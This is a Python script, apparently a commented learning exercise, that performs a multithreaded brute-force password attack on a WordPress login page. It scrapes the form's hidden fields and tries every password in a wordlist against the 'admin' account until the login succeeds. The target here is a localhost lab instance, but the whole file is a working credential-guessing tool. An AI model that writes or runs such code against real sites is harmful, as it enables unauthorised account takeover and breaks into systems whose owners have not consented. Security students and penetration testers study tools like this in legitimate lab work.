from io import BytesIO                                          # Allows to treat bytes in memory like a file. 
                                                                # Here HTML response content comes in as bytes, and lxml is given a file-like object built from those bytes.
from lxml import etree                                          # Used for parsing HTML/XML and walking through elements.
from queue import Queue                                         # Handles synchronization internally, so several threads can safely
                                                                # add items with put() and remove items with get() at the same time.

import requests                                                 # To make HTTP requests like GET and POST.
import threading                                                # Lets us create multiple threads that run concurrently. 
import time                                                     # To pause each worker thread for 5 seconds between attempts.

SUCCESS = 'Welcome to WordPress!'                               # Our code later checks whether this string appears in a response body. If it does, the code treats that as success.
TARGET = "http://localhost:8080/wp-login.php"
WORDLIST = "/home/kali/Downloads/cain-and-abel.txt" 

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()

    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):                                                # Finds all input elements.
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params 

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)
    
    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
    
    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                print('done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('admin', TARGET)
    b.run_bruteforce(words)
